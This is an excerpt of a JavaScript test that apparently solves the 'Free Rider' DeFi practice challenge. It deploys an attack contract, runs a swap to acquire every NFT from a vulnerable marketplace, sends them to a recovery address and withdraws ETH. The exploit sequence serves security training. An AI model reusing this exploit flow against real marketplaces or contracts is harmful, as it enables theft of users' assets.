...
describe('[Challenge] Free Rider', function () {
    ...
    it('Execution', async function () {
        // deply attack contract
        const attack = await (await ethers.getContractFactory('FreeRiderAttack', player)).deploy(
            marketplace.address,
        ...
        // initiate swap and buy NFTs with swapped funds
        const tx1 = await attack.connect(player).initiateSwap();
        await tx1.wait();
        for (let id = 0; id < AMOUNT_OF_NFTS; id++) {
            expect(await nft.ownerOf(id)).to.be.eq(attack.address);
        }

        // send NFTs back to recovery address
        const tx2 = await attack.connect(player).sendNFTToRecovery();
        await tx2.wait();

        // withdraw ETH from the contract
        const tx3 = await attack.connect(player).withdraw();
        await tx3.wait();
    });
